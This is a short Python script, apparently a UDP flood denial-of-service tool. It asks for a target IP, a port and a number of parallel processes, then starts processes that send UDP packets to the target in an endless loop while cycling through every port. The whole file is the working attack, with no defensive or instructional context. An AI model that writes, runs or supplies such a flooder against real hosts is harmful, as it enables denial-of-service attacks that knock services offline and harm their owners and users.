def attack(P_num,ip,port):
    import sys
    import os
    import time
    import socket
    import random
    # Code Time
    from datetime import datetime
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    sent=0

    while True:
        sock.sendto("any word".encode(encoding="utf_8",errors="strict"),(ip,port))
        sent = sent + 1
        port = port + 1
        print("%s Proccess Sent %s packet to %s throught port:%s" % (P_num,sent, ip, port))
        if port == 65534:
            port = 1

if __name__ == '__main__':
    import os
    from multiprocessing import Process
    ip = input("IP Target : ")
    port = int(input("Port       : "))
    num=input("并行数        :")
    list=[]
    for i in range(int(num)):
        p=Process(target=attack,args=(i,ip,port))
        list.append(p)
    for i in list:
        i.start()
    for i in list:
        i.join()